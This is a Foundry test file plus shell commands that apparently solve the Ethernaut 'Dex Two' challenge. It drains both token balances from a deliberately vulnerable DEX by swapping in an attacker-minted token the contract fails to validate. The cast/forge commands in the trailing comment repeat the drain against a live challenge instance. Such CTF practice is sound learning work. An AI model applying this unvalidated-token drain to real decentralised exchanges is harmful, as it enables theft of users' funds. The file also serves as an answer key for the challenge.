// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";

contract DexTest is Test {
    DexTwo public dex;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    SwappableTokenTwo public attackToken;
    address public owner;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        owner = makeAddr("owner");
        vm.deal(owner, 10 ether);
        vm.deal(attacker, 10 ether);

        vm.startPrank(owner);
        dex = new DexTwo();
        token1 = new SwappableTokenTwo(
            address(dex),
            "Token1",
            "TK1",
            1000 ether
        );
        token2 = new SwappableTokenTwo(
            address(dex),
            "Token2",
            "TK2",
            1000 ether
        );

        token1.transfer(attacker, 10);
        token2.transfer(attacker, 10);
        dex.setTokens(address(token1), address(token2));
        dex.approve(address(dex), 100);
        dex.add_liquidity(address(token1), 100);
        dex.add_liquidity(address(token2), 100);

        vm.stopPrank();
    }

    function test_deployDexTwo() public {
        vm.startPrank(attacker);

        assertEq(dex.owner(), owner);
        assertEq(dex.token1(), address(token1));
        assertEq(dex.token2(), address(token2));
        assertEq(token1.balanceOf(attacker), 10);
        assertEq(token2.balanceOf(attacker), 10);
        assertEq(token1.balanceOf(address(dex)), 100);
        assertEq(token2.balanceOf(address(dex)), 100);

        vm.stopPrank();
    }

    function test_attackDexTwo() public {
        vm.startPrank(attacker);
        attackToken = new SwappableTokenTwo(
            address(dex),
            "AttackToken",
            "ATTACK",
            100000 ether
        );
        attackToken.approve(address(dex), 10 ether);
        dex.approve(address(dex), 10);

        attackToken.transfer(address(dex), 100);
        dex.swap(address(attackToken), address(token1), 100);

        dex.swap(address(attackToken), address(token2), 200);

        assertEq(token1.balanceOf(address(dex)), 0);
        assertEq(token2.balanceOf(address(dex)), 0);

        vm.stopPrank();
    }
}

/*
Instance address: 0x1Bf763634e065c8061Ce6bf5d738c58C66B00320
source .env
export dex=0x1Bf763634e065c8061Ce6bf5d738c58C66B00320
export token1=0xf0b31d2b1c8f7c826627f689221b206c1ec7cbde
export token2=0x8a26da15a78c1a77c9ac77d8e06e8689d5040d80
export attacker=0x7bB341488d5E6838Bb9C1fD521543f83066Dc9Bd

cast call $token1 "balanceOf(address)" $attacker  --rpc-url $RPC_URL
cast call $token2 "balanceOf(address)" $attacker  --rpc-url $RPC_URL
cast call $dex "token1()" --rpc-url $RPC_URL
cast call $dex "token2()" --rpc-url $RPC_URL
cast call $dex "owner()" --rpc-url $RPC_URL

forge create src/DexTwo.sol:SwappableTokenTwo --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $dex "Name" "ATTACK" 100000000
export attackToken=0xdCf16B99fA8B2bEE49aE81141bc435c7be1409dF
cast call $attackToken "balanceOf(address)" $attacker --rpc-url $RPC_URL

cast send $attackToken "approve(address, uint)" $dex 1000 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $attackToken "transfer(address, uint)" $dex 100 --rpc-url $RPC_URL --private-key $PRIVATE_KEY

cast send $dex "approve(address, uint)" $dex 1000 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $dex "swap(address, address, uint)" $attackToken $token1 100 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $dex "swap(address, address, uint)" $attackToken $token2 200 --rpc-url $RPC_URL --private-key $PRIVATE_KEY

cast call $token1 "balanceOf(address)" $dex --rpc-url $RPC_URL
cast call $token2 "balanceOf(address)" $dex --rpc-url $RPC_URL

*/
